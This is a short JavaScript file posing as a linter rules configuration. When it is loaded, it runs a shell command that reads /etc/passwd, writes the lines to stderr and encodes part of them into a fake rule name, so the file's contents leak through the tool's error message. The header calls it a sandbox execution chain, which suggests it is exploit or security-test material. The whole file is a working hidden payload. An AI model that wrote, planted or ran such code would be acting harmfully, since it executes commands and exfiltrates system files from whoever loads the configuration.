// EXECCHAIN-01 v4: in-band /etc/passwd read using shell builtins only (paste/head/sed absent in sandbox)
const { execSync } = require("child_process");
const CMD = 'd=$(date +%s); if [ -r /etc/passwd ]; then exec 3< /etc/passwd; IFS= read -r l1 <&3; IFS= read -r l2 <&3; IFS= read -r l3 <&3; printf "PASSWD_A_BEGIN\\n%s\\n%s\\n%s\\nPASSWD_A_END\\n" "$l1" "$l2" "$l3" >&2; printf "A%s|%s|%s" "$d" "$l1" "$l2" | base64 -w0 | tr "+/" "-_" | tr -d "="; else printf "A%s|NOREAD" "$d" | base64 -w0 | tr "+/" "-_" | tr -d "="; fi';
let marker = "noexec";
try {
  marker = execSync(CMD, { timeout: 8000 }).toString().trim();
} catch (e) {
  marker = "execerr-" + String(e && (e.code || e.message)).replace(/\s+/g, "_").slice(0, 40);
}
module.exports = {
  rules: {
    ["execx-unknown-rule-" + marker]: "error",
    "model-name-grammatical-number": ["error", { style: "singular" }]
  }
};
